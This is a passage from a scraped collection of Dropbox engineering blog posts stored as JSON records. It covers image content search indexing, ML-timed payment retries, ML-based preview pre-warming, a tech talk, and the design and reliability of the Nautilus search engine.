relevance score s . Return results with score above a threshold, ranked by the score. Optimizing for scalability This approach is still expensive both in terms of storage space and in query-time processing.  If we have 10,000 categories, then for each image we have to store 10,000 classifier scores in the forward index, at a cost of 40 kilobytes if we use four-byte floating point values.  And because the classifier scores are rarely zero, a typical image will be added to most of those 10,000 posting lists. If we use four-byte integers for the image ids, that’s another 40 kilobytes, for an indexing cost of 80 kilobytes per image.  For many images, the index storage would be larger than the image file! As for query-time processing — which appears as latency to the user performing the search — we can expect about half of the query-category match scores m̂ i to be positive, so we’ll read about 5,000 posting lists from the inverted index.  This compares very poorly with text queries, which typically read about ten posting lists. Fortunately, there are a lot of near-zero values that we can drop to get a much more efficient approximation.  The relevance score for each image was given above as s = q c j c , where q c holds the match scores between the query and each of the roughly 10,000 categories, and j c holds the roughly 10,000 category scores from the classifier. Both vectors consist of mostly near-zero values that make very little contribution to s . In our approximation, we’ll set all but the largest few entries of q c and j c to zero.  Experimentally we’ve found that keeping the top 10 entries of q c and top 50 entries of j c is enough to prevent a degradation in quality. The storage and processing savings are substantial: In the forward index instead of 10,000-dimensional dense vectors we store sparse vectors with 50 nonzero entries — the top 50 category scores for each image.  In a sparse representation we store the position and value of each nonzero entry; 50 two-byte integer positions and 50 four-byte float values requires about 300 bytes. In the inverted index, each image is added to 50 posting lists instead of 10,000, at a cost of about 200 bytes.  So the total index storage per image is 500 bytes instead of 80 kilobytes. At query time, q c has 10 nonzero entries, so we only need to scan 10 posting lists — roughly the same amount of work we do for text queries.  This gives us a smaller result set, which we can score more quickly as well. With these optimizations, indexing and storage costs are reasonable, and query latencies are on par with those for text search.  So when a user initiates a search we can run both text and image searches in parallel, and show the full set of results together, without making the user wait any longer than they would for a text-only search. Current deployment Image content search is currently enabled for all of our Professional and Business level users. We combine image content search for general images, OCR-based search for images of documents , and full-text search for text documents to make most of these users' files available through content-based search. Video search? Of course, we’re working to let you search all of your Dropbox content. Image search is a big step toward that. Eventually, we hope to be able to search video content as well. The techniques to find one frame in a video, or to index an entire clip for searching , perhaps by adapting still image techniques , are still at the research stage, but it was just a few years ago that “find all the photos from my picnic with my dog in them” only worked in Hollywood movies. Our goal is: If it’s in your Dropbox, we’ll find it for you! // Tags Machine Learning // Copy link Link copied Link copied", "date": "2021-05-11"},
{"website": "Dropbox", "title": "Optimizing payments with machine learning", "author": ["Sarah Andrabi"], "link": "https://dropbox.tech/machine-learning/optimizing-payments-with-machine-learning", "abstract": "Subscription renewals and failures Why machine learning for payments? How we did it ML Operations Next steps It’s probably happened to you at some point: You go to use a service for which you believe you’ve got a paid subscription, only to find that it’s been canceled for non-payment. That’s not only bad for you the customer: It causes negative feelings about the brand, it disrupts what should be a steady flow of revenue to the business, and a customer who finds themselves shut off might decide not to come back. At Dropbox, we found that applying machine learning to our handling of customer payments has made us better at keeping subscribers happily humming along. Payments at Dropbox The Dropbox Payments Platform manages payment processing for millions of our customers. When a customer visits the Dropbox website and chooses to buy one of our products, we ask the customer to enter their payment information on the purchase form. After the customer submits the form, the system collects their payment information and securely sends this info, along with the amount we want to charge them, to one of our external partners who process that type of payment information. This all takes place behind the scenes instantly when a customer starts a Dropbox subscription. Once they complete their payment and become a paid customer, they enter our payment lifecycle. All of this, from start to finish, is handled by our Payments Platform. Subscription renewals and failures Customers who have a Dropbox subscription pay for it on a regular cadence—usually monthly or yearly. At the time of a recurring payment, a customer’s credit card is charged automatically (if the customer has authorized us to charge it). If the charge is successful, the subscription is renewed without the customer needing to do anything. However, if the attempt fails, the customer enters what we call renewal failure . When that happens, we have recovery procedures that attempt to keep the customer’s subscription from being disrupted. Figure 1. Involuntary Churn is when a credit card expires or is canceled, or has no funds, etc. Historically, our Payments Platform has used a static set of about ten different methods to determine when to charge a customer whose subscription is in renewal failure. For example, we may charge a customer every four days until a payment succeeds, for a maximum of 28 days. If a customer’s payment still fails at the end of this window, their Dropbox account is downgraded to a free Basic account. Of course, downgrades are a poor customer experience for active users and teams. And involuntary churn can be a lost opportunity for Dropbox. Fig 2. Renewal Attempts Payment failures can happen for a number of reasons. Among them: insufficient funds expired credit card credit card disabled—perhaps reported lost or stolen transient processing failures Some of these failures can be resolved on their own, while others require customer action for recovery. Why machine learning for payments? In the last couple of years, Dropbox ran A/B tests to see if shifting when we charge customers would have an impact on the success rates of those charges. These A/B tests relied heavily upon human intuition and domain knowledge to come up with a set of rules for when to charge a customer. The Payments team had to manually segment users into populations based on their features—subscription type, geographic location, etc—then A/B test our ten or so different hardcoded rule sets to determine which performed the best for those features. The Payments team would then store the best billing policy option as the default for that population. Periodically they would retest to see if the best solutions for different users had changed. On the upside, this approach proved that time of charge had an effect on charge success rates, which allowed Dropbox to keep more subscribers humming along without interruption. But over time a large number of these rules have decayed and hit a performance ceiling. Moreover, manually updating these rules is complex and time-consuming. In a quest to reduce both involuntary churn and the amount of work required to maintain it, the Payments team partnered with the Applied Machine Learning team to experiment with using machine learning (ML) to optimize billing. As a member of the ML team, I knew the challenge is similar to what machine learning experts call the m ulti-armed bandit problem—one has a fixed and limited set of resources to allocate among competing alternatives. With payments, we have to determine when to retry, how many times to retry, and whether we should even attempt a retry. Applying machine learning over time, we identified multiple improvements that even a team of top Payments experts couldn’t have calculated: Removal of manual intervention and complex rule based logic e.g. “Retry every X days” or “Avoid Weekends” Global optimization of multiple parameters for specific customer segments Robustness to customer and market changes An overall increase in payment charge success rates and reduction of collection time In short, applying ML to Payments has made both customers and us happier. How we did it We began by focusing on predicting when to try charges, i.e. identifying the best time to charge customers at the time of subscription renewal, and to retry charging their account during renewal failure. We experimented with different customer segments, specifically starting with Individual customers and teams in North America. We built a gradient boosted ranking model trained with features including types of payment failures, Dropbox account usage patterns, and payment type characteristics. The model ranks the charge attempts by predicted likelihood of success for each charge window. For example, we took an 8 day window and divided it into one-hour chunks, resulting in a total of 192 time chunks. We used our models to find the highest ranking time chunk to attempt the renewal. We also experimented with 6- and 4- day windows. At first, we experimented with optimizing each charge attempt independently. We had a model that optimized when to charge a customer after the first payment failed. If the model’s recommended attempt also failed, we defaulted back to our rule-based logic for the rest of the renewal window. We ran an A/B test for this combination, using a random sampling of the US individual user segments. For targeting we used our internal feature gating service, Stormcrow . The model improved success rates, and we shipped it. Our goal was always end-to-end optimization of renewal failure attempts. Starting with a single model helped validate that ML could be applied to solve this type of problem. However, we realized quickly that this design pattern of having a separate model per payment attempt only created a more complicated system. For example, if we retried 5 times before a payment succeeded, using this design we would end up with 5 models. This went against our secondary goal of using ML to reduce the complexity of the billing system. So we shifted our approach to have a single model that can predict when to charge a customer multiple times until the customer is able to successfully renew, or is downgraded after the maximum renewal window has passed as in Figure 2.  If the first payment failed, we’d ask the model for the next best time to charge. If that failed, we’d again ask the model for the next best time, and so on for a maximum number of times. At that point, if none of the payments have succeeded, the customer is downgraded. But if any of the payments succeeded, the associated invoice was approved no matter how many payment attempts had been made. This specific model is currently being A/B tested in production, using our Stormcrow system to randomly target Dropbox teams for testing. The results so far are positive. Serving predictions Once we had trained models, our next step was to make these models available during payments processing. We needed a way to serve the best time to charge predictions from our machine learning models to the Payments Platform , ensuring they would be used as part of the billing policy. When we first began experimentation, we were using the Payments Platform to load and run the model. This design caused the Payments Platform to bloat significantly due to the added dependencies. Prediction latencies ran to around two minutes on average. To streamline the process, we took advantage of the Predict Service built and managed by the ML Platform team, which manages the infrastructure to help quickly build, deploy and scale machine learning processes at Dropbox. Using Predict Service helped reduce latency for generating model predictions from several minutes to under 300ms for 99 percent of them. Migrating to Predict Service also provided a clean separation between the two systems, and the ability to scale easily. With this plug-and-play machine learning system, the Payments Platform fetches all the signals relevant to a customer and makes a request to the model (served via Predict Service) to get the best time to charge the customer, eliminating all of our old hardcoded sub-optimal billing policies developed over 14 years of A/B testing. The workflow for this system is designed as follows. White represents components of the Payments Platform. Purple represents components of the machine learning system. Get prediction for next time to charge — When a payment attempt for a customer fails, the payments platform makes a request to the predict module to get the next best time to charge the customer. The request is made using the customer id and type. Retrieve customer signals. The predict module collects the most recent usage and payments signals for customers, as well as information about the previous failure. This data is stored in Edgestore (the primary metadata storage system at Dropbox) using a daily scheduled Airflow Job . Request prediction — The collected signals are sent to Predict Service via a GRPC call, which encodes the signals into a feature dataframe and then sends them to the model. Generate prediction — The model returns the best ranked time for when to charge the customer. This prediction is sent back to the predict module, which returns the results to the billing policy. Log prediction results — The predict module also logs the model’s prediction, along with other relevant information that can be used for troubleshooting and analysis. Schedule next charge — Once the payments service receives the best time to charge, it then uses it to schedule the next payment attempt, and stores that in Edgestore . ML Operations Our task wasn’t done upon rollout. We applied DevOps best practices to our data collection and prediction systems: We automated our data collection jobs to run daily, and put monitoring in place to notify us of any failures or delays in the jobs running. For our models and model-serving infrastructure we defined a set of business- and model-specific metrics that we track, and set up alerting in case any metrics go below an acceptable threshold. These are the main metrics and measures we use to ensure that everything is running as expected: Business Metrics Invoice Approval Rate : This is the primary metric that we want to improve. Every time a user’s Dropbox subscription renews, all the payments for that specific renewal are tracked as part of a single invoice. This metric tells us whether the renewal for the user was successful or not. Attempt Success Rate : This metric helps us track the success rates for each individual payment attempt made on behalf of the user. There might be one payment attempt made, or two, four, or more. This metric, along with the Invoice Approval Rate , helps us track how quickly we are able to renew a customer. Model internal monitoring This is a set of measures internal to the training process and tooling being used. These help us determine how well the model is tuned based on the input data, as well as helping to identify any issues with the model while it’s running in production. We measure the following online model metrics to help with diagnostics: Coverage : the percentage of customers that have recommendations from the model compared to the fixed 4 day interval. Number of predictions made by the model: the number of recommendations that the model made successfully without any errors Prediction Latency : how long it took the model to make each recommendation Infrastructure monitoring Along with all the monitoring and alerting in place for Payments Platform and Predict Service, we also track the following to track how well our infrastructure is performing: Freshness and delays in feature data pipelines Availability and latency of Predict Service Availability of EdgeStore We use Grafana dashboards and Vortex for monitoring our model, and infrastructure metrics. For business metrics we use Superset . All these live metrics, and dashboards help us proactively track the expected behavior of the model, enabling us to take appropriate action when it deviates . The responsibility of monitoring these metrics is split between the Payments engineering team and the Applied Machine Learning team. We have troubleshooting guides to help on-call engineers to debug any issues with clear escalation paths. Since ML was new to the Payments engineering team, we spent time explaining how the systems worked, and how to interpret the model’s results. This has helped the two teams successfully collaborate on the project and ensure that everything runs smoothly. Next steps Our experimentation has validated that the ML-based system outperforms our rule-based approach. Moreover, without manual and extensive investment, the rule-based system’s performance will decay over time, whereas the ML system stays sharp through retraining. We can further improve the models by adding more relevant features, and experimenting with different model architectures. Our model targeting individual customers is currently deployed in production. Our model for optimizing the entire renewal cycle is currently running in A/B testing. We’re looking towards expanding our model optimizations from North America to all customers across the globe. There are also more complex model types that we can experiment with—including reinforcement learning—now that we have the data and production pipelines built. As we improve our models, we’ll focus on further improvements to our renewal success rates that will keep customers happy as well. We're hiring! The Applied Machine Learning team and ML Platform team at Dropbox use Machine Learning (ML) to drive outsized business and user value by leveraging a high-fidelity understanding of users, content, and context. We work closely with other product and engineering teams to deliver innovative solutions and features. It’s exciting to find opportunities within Dropbox to improve our processes and customer experiences by applying ML to new fields. We plan to continue to use the lessons from this project and apply them to other areas. The Payments team at Dropbox enables monetization of new and existing products via a flexible payments and collections system and a smooth user experience. We leverage Machine Learning(ML) to optimize our billing and routing systems. We are also actively experimenting with ML based strategies for targeted payments and billing communications. In addition to directly impacting revenue these ML based approaches improve the productivity of the team and maintainability of our systems. See open positions at Dropbox here ! Thanks to: The Payments Engineering, Product, Revenue Analytics, and ML Platform teams for their continued partnership. In particular: Pratik Agrawal, Kirill Sapchuk, Cameron (Cam) Moten, Bryan Fong, Randy Lee, Yi Zhong, Anar Alimov, Aleksandr Livshits, Lakshmi Kumar T, Evgeny Skarbovsky and Ian Baker. // Tags Machine Learning // Copy link Link copied Link copied", "date": "2021-05-17"},
{"website": "Dropbox", "title": "Cannes: How ML saves us $1.7M a year on document previews", "author": ["Win Suen"], "link": "https://dropbox.tech/machine-learning/cannes--how-ml-saves-us--1-7m-a-year-on-document-previews", "abstract": "What are Previews? Tradeoffs in machine learning Cannes v1 Live predictions at scale Operationalizing ML Current state and future exploration Recently, we translated the predictive power of machine learning (ML) into $1.7 million a year in infrastructure cost savings by optimizing how Dropbox generates and caches document previews. Machine learning at Dropbox already powers commonly-used features such as search , file and folder suggestions , and OCR in document scanning. While not all our ML applications are directly visible to the user, they still drive business impact in other ways. What are Previews? The Dropbox Previews feature allows users to view a file without downloading the content. In addition to thumbnail previews, Dropbox also offers an interactive Previews surface with sharing and collaborating capabilities, including comments and tagging other users. Our internal system for securely generating file previews, Riviera, handles preview generation for the hundreds of supported file types . It does this by chaining together various content transformation operations to create the preview assets appropriate for that file type. For example, Riviera might rasterize a page from a multi-page PDF document to show a high-resolution preview on the Dropbox web surface. The full-content preview feature supports interactions such as commenting and sharing. The large image assets might later be converted into image thumbnails that will be shown to the user in a variety of contexts, including search results or the file browser. At Dropbox scale, Riviera processes tens of petabytes of data each day. To speed up the Previews experience for certain classes of large files, Riviera pre-generates and caches preview assets (a process we call pre-warming). The CPU and storage costs of pre-warming are considerable for the volume of files we support. Thumbnail previews when browsing files. Previews can be enlarged and interacted with as a proxy for the application file. We saw an opportunity to reduce this expense with machine learning because some of that pre-generated content was never viewed. If we could effectively predict whether a preview will be used or not, we would save on compute and storage by only pre-warming files that we are confident will be viewed. We dubbed this project Cannes, after the famous city on the French Riviera where international films are previewed. Tradeoffs in machine learning There were two tradeoffs that shaped our guiding principles for preview optimization. The first challenge was to negotiate the cost-benefit tradeoff of infrastructure savings with ML. Pre-warming fewer files saves money—and who doesn’t like that!—but reject a file incorrectly and the user experience suffers. When a cache miss happens, Riviera needs to generate the preview on the fly while the user is waiting for the result to appear. We worked with the Previews team to develop a guardrail against degrading user experience, and used the guardrail to tune a model that would provide a reasonable amount of savings. The other tradeoff was complexity and model performance vs. interpretability and cost of deployment. In general, there is a complexity vs. interpretability tradeoff in ML: more complex models usually have more accurate predictions at the cost of less interpretability of why certain predictions are made, as well as possibly increased complexity in deployment. For the first iteration, we aimed to deliver an interpretable ML solution as quickly as possible. Since Cannes was a new application of ML built into an existing system, favoring a simpler, more interpretable model let us focus on getting the model serving, metrics, and reporting pieces right before we added more complexity. Should something go wrong or we surface unexpected behavior in Riviera, the ML team could also more easily debug and understand whether the cause was Cannes or something else. The solution needed to be relatively easy and low cost to deploy for nearly half a billion requests per day. The current system was simply pre-warming all previewable files, so any improvement on this would result in savings—and the sooner the better! Cannes v1 With these tradeoffs in mind, we targeted a simple, fast-to-train, and explainable model for Cannes. The v1 model was a gradient-boosted classifier trained on input features including file extension, the type of Dropbox account the file was stored in, and most recent 30 days of activity in that account. On an offline holdout set, we found this model could predict previews up to 60 days after time of pre-warm with >70% accuracy. The model rejected about 40% of pre-warm requests in the holdout, and performance was within the guardrail metrics we set for ourselves at the onset. There were a small number of false negatives (files that we predicted would not be viewed, but did end up being viewed in the subsequent 60 days), which would cause us to pay the cost of generating preview assets on the fly. We used the “percentage-rejected” metric minus the false negatives to ballpark the $1.7 million total annual savings. Even before we explored the Previews optimization space, we wanted to ensure the potential savings outweighed the cost of building an ML solution. We had a ballpark estimate of the projected savings we wanted to target with Cannes. Designing and deploying ML systems in large, distributed systems means accepting some changes to the system will impact your estimates over time. By keeping the initial model simpler, we hoped the order of magnitude of the cost impact would remain worthwhile even if there are small changes to adjacent systems over time. Analyzing the trained model gave us a better idea of what we actually would save in v1 and confirmed the investment was still worthwhile. We conducted an A/B test of the model on a random 1% sample of Dropbox traffic using our internal feature gating service, Stormcrow . We validated that model accuracy and pre-warms “saved” were in line with our results from offline analysis—which was good news! Because Cannes v1 no longer pre-warms all eligible files, we expected the cache hit rate to drop; during the experiment, we observed a cache hit rate a couple percentage points lower than the holdout population from the A/B test. Despite this drop, overall preview latency remained largely unchanged. We were especially interested in tail latency (latency for requests above the 90th percentile), because cache misses that contributed to higher tail latency would more severely impact users of the Previews feature. It was encouraging that we did not observe a degradation to either preview tail latency or overall latency. The live test gave us some confidence to begin deploying the v1 model to more Dropbox traffic. Live predictions at scale We needed a way to serve real-time predictions to Riviera on whether to pre-warm a given file as files come through the pre-warming path. To solve this problem, we built Cannes as a prediction pipeline that fetches signals relevant to a file and feeds them into a model that predicts the probability of future previews being used. Cannes architecture Receive file id from Riviera pre-warm path . Riviera collects all file ids eligible for pre-warm. (Riviera can preview ~98% of files stored on Dropbox. There are a small number of files that are not a supported file type or otherwise cannot be previewed .) Riviera sends a prediction request with the file id we need a prediction for and the  file type. Retrieve live signals . To collect the most recent activity signals for a file at prediction time, we use an internal service named the Suggest Backend . This service validates the prediction request, then queries for the appropriate signals relevant to that file. Signals are stored in either Edgestore (Dropbox’s primary metadata storage system) or the User Profile Service (a RocksDB data store which aggregates Dropbox activity signals). Encode signals into feature vector . The collected signals are sent to the Predict Service , which encodes the raw signals into a feature vector representing all relevant information for the file, then sends this vector to a model for evaluation. Generate a prediction . The model uses the feature vector to return a predicted probability that the file preview will be used. This prediction is then sent back to Riviera, which pre-warms files likely to be previewed up to 60 days in the future. Log information about request . Suggest Backend logs the feature vector, prediction results, and request stats—critical information for troubleshooting performance degradation and latency issues. Additional consideration Reducing prediction latency is important because the pipeline above is on the critical path for Riviera’s pre-warming functionality. For example, when rolling out to 25% of traffic, we observed edge cases that decreased Suggest Backend availability to below our internal SLAs. Further profiling showed that these cases were timing out on step 3. We improved the feature encoding step and added several other optimizations to the prediction path, bringing tail latency down for those edge cases. Operationalizing ML During the rollout process and beyond, we emphasized stability and making sure not to negatively impact the customer experience on the Previews surface. Close monitoring and alerting on multiple levels are critical components of the ML deployment process. Cannes v1 metrics Prediction serving infra metrics: Shared systems have their own internal SLAs around uptime and availability. We rely on existing tools like Grafana for real-time monitoring and alerts. Metrics include: Availability of Suggest Backend and Predict Service Data freshness of User Profile Service (our activity data store) Preview metrics : We have key metrics for preview performance—namely, preview latency distribution. We left a 3% holdout for comparing previews metrics with and without Cannes, guarding against model drift or unanticipated system changes that could degrade model performance. Grafana is also a common solution for application-level metrics. Metrics include: Preview latency distribution (Cannes vs non-Cannes holdout), with extra attention to latency above p90 Cache hit rate (Cannes vs non-Cannes holdout): total cache hits/total requests to preview content Model performance metrics : We have model metrics for Cannes v1 that the ML team consumes. We built our own pipeline for calculating these metrics. Metrics of interest include: Confusion matrix , with extra attention to changes in rate of false negatives Area under ROC curve : While we directly monitor the confusion matrix stats, we also calculate an AUROC with an eye towards using it to compare to performance of future models. The model performance metrics above are calculated hourly and stored in Hive. We use Superset for visualizing important metrics and creating a live dashboard of Cannes performance over time. Superset alerts built off the metrics tables proactively let us know when underlying model behavior has changed, hopefully well in advance of any client-facing impact. However, monitoring and alerting alone are insufficient for ensuring system health; establishing clear ownership and escalation processes is also necessary. For instance, we documented specific upstream dependencies of ML systems that could impact the results of the model. We also created a runbook for the on-call engineer which details steps for troubleshooting whether the issue is within Cannes or another part of the system, and a path of escalation if the root cause is the ML model. Close collaboration between ML and non-ML teams thus helps ensure Cannes continues to run smoothly. Current state and future exploration Cannes is now deployed to almost all Dropbox traffic. As a result, we replaced an estimated $1.7 million in annual pre-warm costs with $9,000 in ML infrastructure per year (primarily from increased traffic to Suggest Backend and Predict Service). There are many exciting avenues to explore for the next iteration of this project. There are more complex model types we can experiment with now that the rest of the Cannes system is in production. We can also develop a more fine-tuned cost function for the model based on more detailed internal expense and usage data. Another new Previews application we’ve discussed is using ML to make predictive decisions more granular than a binary prewarm/don’t-prewarm per file. We may be able to realize further savings by being more creative with predictive prewarming, reducing costs with no deterioration to the file preview experience from the user’s perspective. We hope to generalize the lessons and tools built for Cannes to other infrastructure efforts at Dropbox. ML for infrastructure optimization is an exciting area of investment. Thanks to the Previews and ML Platform teams for their partnership on Cannes. In particular, kudos to Zena Hira, Jongmin Baek, Jason Briceno, Neeraj Kumar, and Kris Concepcion on the ML team; Anagha Mudigonda, Daniel Wagner and Robert Halas on the Previews team; and Ian Baker, Sean Chang, Aditya Jayaraman, and Mike Loh on the ML Platform team. About Us: The Intelligence team at Dropbox uses machine learning (ML) to drive outsized business and user value by leveraging a high fidelity understanding of users, content, and context. We work closely with other product and engineering teams to deliver innovative solutions and features. See open positions at Dropbox here ! // Tags Machine Learning Machine Intelligence Infrastructure Previews cost optimization // Copy link Link copied Link copied", "date": "2021-01-27"},
{"website": "Dropbox", "title": "Hilary Mason Speaks at Dropbox", "author": ["Martin"], "link": "https://dropbox.tech/machine-learning/hilary-mason-speaks-at-dropbox", "abstract": "We host a monthly tech talk series we call Droptalks. In the past, we've hosted Steve Souders, Guido van Rossum, Greg Papadopoulos, and Amit Singh. A couple weeks ago, we were lucky to have Hilary Mason in town. Hilary is the Chief Scientist of bit.ly , the world-famous URL shortener. Bit.ly may seem like a simple service, however, when done at such a large scale there is much more behind the scenes. There's also a lot of neat data to play with. Hilary spoke about some of the challenges and lessons from her work trying to derive meaningful uses from the mass of data that flows through bit.ly. She spoke about the history of bit.ly, some of the philosophy of analyzing time-series data, and some cool engineering tricks. She even gave demos of three internal tools at bit.ly that will be released as products in the next few months (really cool stuff!). And here are the slides. For those interested in learning more about Analytics and Data Science, Hilary suggested a few introductory books: Drew Conway’s and John Myles White’s Machine Learning for Hackers which “uses R on web data and email data”. Toby Segaran’s Programming Collective Intelligence – which is “getting a little out-dated, … but it’s a really good introduction to how to think about a machine learning program”. “If you just want the math side, … the core canonical math book” is Christopher M. Bishop’s Pattern Recognition and Machine Learning . // Tags Machine Learning // Copy link Link copied Link copied", "date": "2012-02-23"},
{"website": "Dropbox", "title": "Validating performance and reliability of the new Dropbox search engine", "author": ["Diwaker Gupta"], "link": "https://dropbox.tech/machine-learning/validating-performance-and-reliability-of-the-new-dropbox-search-engine", "abstract": "Performance Reliability Recovery In our previous post , we discussed the architecture of our new search engine, named Nautilus, and its use of machine intelligence to scale our search\n \n ranking and content\n \n understanding models. \n Along with\n  best\n -\n in\n -\n class performance, scalability\n ,\n  and reliability\n \n we also provided\n  a foundation for implementing intelligent features\n . This\n  flexible system allow\n s\n  our engineers to easily customize the document\n \n indexing and query\n \n processing pipelines \n while maintaining\nstrong safeguards to preserve the privacy of our users’ data\n . \n In this post, we will discuss the process that we performance and reliability. Performance Index format Each of the hundreds of our search leaves runs our retrieval engine, whose responsibilities include handling both updating the index when files get created, edited, and deleted (those are “writes”) as well as servicing search queries (these are “reads”). Dropbox traffic has the interesting characteristic that it is dominated by writes—that is, files are updated way more frequently than they are searched for. We typically observe a volume of writes which is 10x higher than reads. As such, we carefully considered those workloads when optimizing the data structures used in the retrieval engine. A “posting list” is a data structure that maps a token (i.e., a potential search term) to the list of documents containing that token. At its core, a retrieval engine’s primary job is to maintain a set of posting lists which constitute the inverted index . Posting lists are queried during search requests, and updated when updates are applied to the index. A common posting list format stores the token and an associated list of document ids, along with some metadata that can be used during scoring phase (ex: term frequency). This format is ideal for workloads which are primarily read-only: each search query only requires finding the appropriate set of posting lists (which can be O(1) using a hash table) and then adding each of the associated doc ids to the result set. However, in order to be able to handle the high update rates we observed in our users’ behavior, we made the decision to use an “exploded” posting list format for the reverse index. Our reverse index is backed by a key/value store ( RocksDB ) and each (namespace ID, token, document ID) tuple is stored as a separate row. More specifically, the format of the row key is \"<namespace ID>|<token>|<doc ID>\". Given a search query against documents in a specific namespace, we can efficiently run a prefix search for <namespace ID><token>| in the index to get a list of all matching documents. Having the namespace concept built into the format of the key has several benefits. First and very importantly, in terms of security since it prevents any possibility a query would return documents outside of the specified namespace the user has access to. Second, in terms of performance since it narrows the search to only the documents included in the namespace as opposed to the much larger set of documents indexed in the partition. With this scheme, the value of each row stores the metadata associated with the token. From a storage and retrieval perspective, this is less efficient compared to the more conventional format where all document ids are grouped and can be stored in a compact representation by using techniques such as delta encoding. But the “exploded” representation has the main benefit of handling index mutations particularly efficiently. For example, a document is added to the reverse index by inserting a row for each token it contains—this is a simple operation that performs very efficiently on most key/value stores, including RocksDB. The extra storage penalty is alleviated by the fact that RocksDB applies prefix compression of keys—overall we found the index size using an exploded representation was only about 15% larger compared to one using a conventional posting list representation. Serving Responsive performance is critical to a smooth and interactive user experience. The primary metric we use for evaluating serving performance is query latency at 95th and 99th percentile, i.e., the slowest 5% and 1% of queries should be no slower than 500ms and 1sec, respectively (currently). The median query will, of course, be significantly faster. As the development of the Nautilus system progressed, we continuously measured and analyzed performance. Each component of the system is instrumented in order to be able to determine how much it contributes to the overall latency. We learned a few lessons along the way, including: Do not prematurely optimize: We refrained from improving the retrieval engine performance until we understood how every component of the system contributed to overall latency. One might have expected the bulk of the time to be spent in the retrieval phase; but after an initial analysis of the data, we determined that a significant portion of the latency actually came from fetching metadata from external systems—backed by relational databases—for checking ACLs and “decorating” the search results before returning them. This includes things like listing the folder path, creator, last modified time, etc. Fear the “query of death”: Overall latency can be very adversely impacted by a few harmful queries, sometime referred to as “queries of death.” These usually result from errors in software that programmatically hits the search API, rather than human users. We built circuit breakers that filter out those queries in order to protect the overall system. In addition, we implemented the ability to respect a “time budget”—where the retrieval engine stops fetching candidates for a query once its allocated time budget is exceeded. We found that this helps performance and the overall system load, but at the cost of sometimes not returning all possible results. This mostly happens for very broad queries that match many candidates—for example when doing prefix search on a single token (as happens during the auto-completion of search queries). Replicas can help with tail latency too: Our leaves are replicated 2X for redundancy in case the machine runs into problems. However, these replicas have a performance benefit as well: they can be used for improving tail latency (the latency of the slowest requests). We use the well-known technique of sending a query to all replicas and returning the response from the fastest one. Invest in building benchmarking tools: Once a specific component is identified as a performance bottleneck, writing a benchmarking tool to load test and measure performance of that specific component is a better way to iterate quickly on improving performances than testing the whole system. In our case, we wrote a benchmark tool for the core retrieval engine which runs on the leaves. We use it to measure the engine’s indexing and retrieval performance at the partition level against synthetic data. The partition data is generated to have characteristics close to production in terms of overall number of namespaces, documents, tokens, as well as distribution of number of documents per namespace, and number of tokens per document. Reliability Millions of users rely on Dropbox search in order to perform their work, so we paid special attention when designing the system to ensure that we could guarantee the uptime our users expect. In a large distributed system, network or hardware failures and software crashes happen regularly—they are inevitable. We kept this fact in mind when we designed Nautilus, focusing particularly on fault-tolerance and automatic recovery for components in the serving path. Some of the components were designed to be stateless, meaning that they rely on no external services or data to operate. This includes Octopus, our results merging and ranking system; and the root of the retrieval engine, which fans out search requests to all the leaves. These services can thus be easily deployed with multiple instances, each of which can be automatically reprovisioned as failures occur. The problem is more challenging when it comes to the leaves instances, since they maintain the index data. Partition assignment In Nautilus, each leaf instance is responsible for handling a subset of the search index, called a “partition.” We maintain a registry of all leaves and assign partitions to the leaves using a separate coordinator. The coordinator is responsible for ensuring continuous coverage for 100% of the partitions. When a new leaf instance is brought up, it stays idle until instructed by the coordinator to serve a partition, at which point it loads the index and then starts accepting search requests. What happens if a leaf is in the process of coming online, but there is a search request for data in its partition? We deal with this by maintaining replicas of each leaf, which together are called “leaf replica groups.” A replica group is an independent cluster of leaf instances providing full coverage of the index. For example, to ensure 2X replication for the system, we run two replica groups, with one coordinator per group. In addition to making it simple to reason about replication, this setup provides operational benefits for doing maintenance, such as: New code can be rolled out to production without any availability-impact by simply deploying it to one group after another. An entire group can be added or removed. This is particularly handy for doing hardware or OS upgrades. For example, a group running on new hardware can be added, and once it is fully operational, we can then decommission the group running on the older hardware. In both of these cases, Nautilus is fully able to answer all requests throughout the entire process. Recovery Each leaf group is over-provisioned with about 15% extra hardware capacity to have a pool of idle instances standing by. When the coordinator detects a drop in partition coverage (i.e., say a currently active leaf suddenly stops serving requests), it reacts by picking an idle leaf and instructing it to serve the lost partition. That leaf then performs the following steps: Download the index data associated with the partition from the index repository. This provides the leaf with a stale index since it was generated some time ago by the offline build system. Replay old mutations from the Kafka queue starting at the offset corresponding to when the index partition was built. Once these older mutations have finished being applied on top of the downloaded index, it means the leaf index is up to date. At that point the leaf goes into serving mode and starts processing queries. Nautilus is a prime example of the type of large scale projects involving data retrieval and machine learning that engineers at Dropbox tackle. If you are interested in these kinds of problems, we would love to have you on our team . Thanks to: Adam Faulkner, Adhiraj Somani, Alan Shieh, Annie Zhou, Braeden Kepner, Elliott Jin, Franck Chastagnol, Han Lee, Harald Schiöberg, Ivan Traus, Kelly Liu, Michael Mi, Peng Wang, Rajesh Venkataraman, Ross Semenov, and Sammy Steele. // Tags Machine Learning Search // Copy link Link copied Link copied", "date": "2018-10-02"},
{"website": "Dropbox", "title": "Architecture of Nautilus, the new Dropbox search engine", "author": ["Diwaker Gupta"], "link": "https://dropbox.tech/machine-learning/architecture-of-nautilus-the-new-dropbox-search-engine", "abstract": "High level architecture Indexing Serving Conclusion Over the last few months, the Search Infrastructure engineering team at Dropbox has been busy releasing a new full-text search engine called Nautilus, as a replacement for our previous search engine . Search presents a unique challenge when it comes to Dropbox due to our massive scale—with hundreds of billions of pieces of content—and also due to the need for providing a personalized search experience to each of our 500M+ registered users. It’s personalized in multiple ways: not only does each user have access to a different set of documents, but users also have different preferences and behaviors in how they search. This is in contrast to web search engines, where the focus on personalization is almost entirely on the latter aspect, but over a corpus of documents that are largely the same for each user (localities aside). In addition, some of the content that we’re indexing for search changes quite often. For example, think about a user (or several users) working on a report or a presentation. They will save multiple versions over time, each of which might change the search terms that the document should be retrievable by. More generally, we want to help users find the most relevant documents for a given query—at this particular moment in time—in the most efficient way possible. This requires being able to leverage machine intelligence at several stages in the search pipeline, from content-specific machine learning (such as image understanding systems) to learning systems that can better rank search results to suit each user’s preferences. The Nautilus team worked with our machine intelligence platform to scale our search ranking and content understanding models. These kind of systems require a lot of iteration to get right, and so it is crucial to be able to experiment with different algorithms and subsystems, and gradually improve the system over time, piece-by-piece. Thus, the primary objectives we set for ourselves when starting the Nautilus project were to: Deliver best-in-class performance, scalability, and reliability to deal with the scale of our data Provide a foundation for implementing intelligent document ranking and retrieval features Build a flexible system that would allow our engineers to easily customize the document-indexing and query-processing 